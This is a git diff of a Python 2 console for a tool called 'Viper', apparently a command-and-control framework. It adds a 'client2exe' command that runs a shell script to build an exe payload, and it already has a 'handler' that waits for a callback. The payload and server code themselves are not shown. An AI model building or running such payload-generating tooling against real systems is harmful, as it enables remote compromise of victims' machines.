@@ -1,5 +1,6 @@
 #!/usr/bin/python
 
+import subprocess
 import os
 import sys
 import readline
@@ -35,7 +36,7 @@ def menu():
     print "[*] Command options: "
     print
     print "[*] handler ========= > starts the viper server and waits for a call back" 
-    print "[*] ??????? ========= > "
+    print "[*] client2exe ========= > builds a exe payload and stores it inside payloads"
     print "[*] ??????? ========= > " 
     print "[*] ??????? ========= > " 
     print "[*] ??????? ========= > " 
@@ -47,7 +48,7 @@ def menu():
 def console():
 	while(True):
 		command = raw_input('$ Viper>> ')
-		command = command.split() 
+		command = command.split(" ") 
 
 		if command[0] == 'ls':
 			dire = '.'
@@ -61,10 +62,17 @@ def console():
 		
 		elif 'handler' in command:
 			print ( "[+] Starting server standby " + viperserver.main())
+		
+		elif 'client2exe' in command:
+			#subprocess.call("payloads/Client2exe.sh", stdin=None, stdout=None, stderr=None, shell=True)
+			subprocess.call("payloads/Client2exe.sh 2>/dev/null", shell=True)
+			print ( "[+] created the exe inside the payloads folder. Reminder you still may have a payload in /var/www/html")
+			pass
+			#banner()			
+			#menu()
 			
 		else:
-			print('error')
-			print('error')
+			print('')
 
 		
 		
